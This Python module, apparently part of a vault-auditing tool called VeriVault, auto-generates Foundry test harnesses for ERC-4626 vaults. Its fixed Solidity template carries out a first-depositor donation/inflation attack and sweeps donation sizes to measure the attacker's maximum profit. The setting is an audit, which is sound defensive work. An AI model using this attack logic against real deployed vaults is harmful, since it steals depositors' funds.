"""verivault.autowire — STAGE-3 DETERMINISTICO: genera un harness forge FEDELE per un vault ERC-4626
(IVault-compatibile) MAI-VISTO, riempiendo SOLO import + deploy. L'attacco è il template parametrico
FISSO (donation/first-depositor inflation che chiama l'ABI reale) → l'LLM/parser NON scrive l'attacco → FP=0.

Niente API/LLM: parsing deterministico del costruttore (il solo pezzo per-contratto). ABSTAIN onesto
(ValueError con reason) se il vault non è parsabile/compatibile → il CLI lo trasforma in ABSTAIN dichiarato.

Riusa lo stesso template di `gate/test/Stage3_UnseenVulnVault.t.sol` (verificato, FP=0).
"""
from __future__ import annotations
import os, re, shutil

# template harness (identico allo Stage-3 verificato; {placeholder} riempiti deterministicamente).
_HARNESS = '''// SPDX-License-Identifier: MIT
// AUTO-GENERATO da VeriVault (autowire DETERMINISTICO). Riempiti SOLO import+deploy; l'attacco è il
// template parametrico FISSO (fedele, chiama l'ABI reale) -> l'auto-wiring NON scrive l'attacco -> FP=0.
// MockToken INLINE (niente import di src/Targets.sol) -> nessuna collisione di nome col vault sotto audit.
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {{ERC20}} from "solmate/tokens/ERC20.sol";
import {{{name}}} from "../targets/{target_file}";
contract {mock} is ERC20 {{
    constructor() ERC20("Mock", "MCK", 18) {{}}
    function mint(address to, uint256 amt) external {{ _mint(to, amt); }}
}}
contract {harness} is Test {{
    address atk = address(0xA11CE); address vic = address(0xB0B);
    function _oneAttack({name} v, {mock} t, uint256 V, uint256 D) internal returns (int256 profit, bool blocked) {{
        t.mint(atk, 1 + D); t.mint(vic, V);
        vm.startPrank(atk); t.approve(address(v), type(uint256).max);
        try v.deposit(1, atk) returns (uint256) {{}} catch {{ vm.stopPrank(); return (int256(0), true); }}
        t.transfer(address(v), D); vm.stopPrank();
        vm.startPrank(vic); t.approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) {{ vm.stopPrank(); }} catch {{ vm.stopPrank(); return (int256(0), true); }}
        vm.startPrank(atk); uint256 got = v.redeem(v.balanceOf(atk), atk, atk); vm.stopPrank();
        return (int256(got) - int256(1 + D), false);
    }}
    function testAuto() public {{
        uint256 V = 100e18;
        uint256[12] memory Ds = [uint256(1e18),10e18,25e18,40e18,49e18,50e18,51e18,60e18,75e18,90e18,99e18,100e18];
        int256 maxP = type(int256).min; uint256 bestD;
        for (uint256 i=0;i<12;i++){{ {mock} t = new {mock}(); {name} v = new {name}({deploy_arg});
            (int256 p, bool b) = _oneAttack(v, t, V, Ds[i]); if (b) continue; if (p > maxP){{ maxP = p; bestD = Ds[i]; }} }}
        emit log_string(string.concat("RESULT {result_key} maxProfit=", vm.toString(maxP), " witness=", vm.toString(bestD)));
    }}
}}
'''


def _snake(s: str) -> str:
    return re.sub(r"(?<!^)(?=[A-Z])", "_", s).lower()


def parse_vault(src: str):
    """(contract_name, deploy_arg) dal sorgente. deploy_arg = come passare l'asset al costruttore.
    Solleva ValueError(reason) se non parsabile. Deterministico, copre solmate(ERC20)/OZ/solady(address)."""
    # 1) il vault = un contract che eredita un ERC4626-like (case-insensitive) o ha redeem(
    name = None
    for m in re.finditer(r"contract\s+(\w+)\s+is\s+([^{]+)\{", src):
        bases = m.group(2)
        if re.search(r"4626", bases, re.I):
            name = m.group(1); break
    if name is None:
        # fallback: un contract con una funzione redeem( (firma ERC4626)
        for m in re.finditer(r"contract\s+(\w+)\b", src):
            body = src[m.end():]
            nxt = re.search(r"\bcontract\s+\w+\b", body)
            body = body[: nxt.start()] if nxt else body
            if re.search(r"\bfunction\s+redeem\s*\(", body) or re.search(r"\bredeem\s*\(", body):
                name = m.group(1); break
    if name is None:
        raise ValueError("nessun contract ERC4626-like (eredita *4626 o ha redeem()) trovato")

    # 2) tipo del primo parametro del costruttore di QUEL contract
    cm = re.search(r"contract\s+" + re.escape(name) + r"\b", src)
    body = src[cm.end():]
    nxt = re.search(r"\bcontract\s+\w+\b", body)
    body = body[: nxt.start()] if nxt else body
    cons = re.search(r"constructor\s*\(\s*([\w.]+)\s+\w+", body)
    if not cons:
        raise ValueError(f"{name}: costruttore senza parametro-asset parsabile (firma non-standard)")
    ptype = cons.group(1)
    if ptype == "ERC20":
        deploy_arg = "ERC20(address(t))"          # solmate ERC4626
    elif ptype in ("address",):
        deploy_arg = "address(t)"                  # OZ / Solady (wrappano internamente)
    else:
        deploy_arg = "address(t)"                  # IERC20/altri -> prova address; ABSTAIN se non compila
    return name, deploy_arg


def autowire(sol_path: str, gate_dir: str) -> dict:
    """Genera+scrive l'harness fedele e copia il target nel gate. Ritorna {gate_test, result_key, cleanup}.
    Solleva ValueError(reason) se non parsabile -> il chiamante emette ABSTAIN dichiarato."""
    src = open(sol_path, encoding="utf-8", errors="ignore").read()
    name, deploy_arg = parse_vault(src)
    result_key = "autogen_" + _snake(name)
    target_file = f"_autogen_{name}.sol"
    targets_dir = os.path.join(gate_dir, "targets")
    test_dir = os.path.join(gate_dir, "test")
    if not (os.path.isdir(targets_dir) and os.path.isdir(test_dir)):
        raise ValueError(f"gate-dir non valido (manca targets/ o test/): {gate_dir}")
    target_dst = os.path.join(targets_dir, target_file)
    # normalizza il pragma (pin esatto '0.8.x' -> caret '^0.8.20') per compilare col solc del gate (0.8.24)
    src_norm = re.sub(r"pragma\s+solidity\s+[^;]+;", "pragma solidity ^0.8.20;", src, count=1)
    with open(target_dst, "w", encoding="utf-8") as f:
        f.write(src_norm)
    harness = f"_AutoGen_{name}"
    test_file = f"{harness}.t.sol"
    test_dst = os.path.join(test_dir, test_file)
    with open(test_dst, "w", encoding="utf-8") as f:
        f.write(_HARNESS.format(name=name, target_file=target_file, harness=harness,
                                mock=f"_AutoMock_{name}", deploy_arg=deploy_arg, result_key=result_key))

    def cleanup():
        for p in (target_dst, test_dst):
            try:
                os.remove(p)
            except OSError:
                pass

    return dict(gate_test=f"test/{test_file}", result_key=result_key, contract=name, cleanup=cleanup)
